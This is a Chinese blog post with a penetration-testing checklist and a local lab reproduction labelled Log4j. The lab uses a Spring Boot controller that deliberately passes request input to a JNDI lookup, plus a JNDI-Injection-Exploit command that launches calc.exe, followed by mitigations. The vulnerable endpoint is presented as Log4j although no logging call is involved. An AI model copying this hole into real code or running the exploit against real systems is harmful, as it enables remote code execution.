---
title: 渗透实践
date: 2022-02-06 11:50:58
tags:
categories:
description:
keywords:

---

# 渗透实践

1.收集信息

- 服务器的相关信息（ip，系统类型，端口号，waf）
- 网站指纹（cms，cdn，证书，dns记录）
- whois信息，姓名，备案，邮箱，电话反查询
- 子域名，旁站，C段
- Google hacking针对的渗透，pdf，中间件，弱口令
- 扫描目录，爆后台，网站banner，测试文件，敏感文件泄露
- 传输协议，通用漏洞，exp，github源码

2.漏洞挖掘

- 浏览网站，看看网站规模，功能，特点等
- 端口，弱口令，目录等扫描
- XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等





### 复现实战

Log4j

首先在GitHub下载poc

https://github.com/welk1n/JNDI-Injection-Exploit

然后随便搭建一个SpringBoot项目

然后创建一个Controller

```java

@Controller
public class TestController {

    public static final Logger logger = LogManager.getLogger();
    @GetMapping("/aaaa")
    @ResponseBody
    public String hello(String i){
        try {
            InitialContext ctx = new InitialContext();
            ctx.lookup(i);
            ctx.lookup(i);
        } catch (NamingException e) {
            e.printStackTrace();
        }
        return "111";
    }

}

```

然后启动服务

>Apache-Log4j-Learning-main\tools>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "C:\Windows\System32\calc.exe" -A "127.0.0.1"
>
>
>
>[-C 执行命令] [-A 目标ip]

![image-20220210112011646](D:\Code\pojo\Blog\BlogHexo\public\img\实战-1.png)

根据jdk的版本来选择不同的接口地址,只需要传递进去即可执行命令





**修复方法**

项目启动的时候运行

> -Dlog4j2.formatMsgNoLookups=true



升级log4j2版本至2.15.0





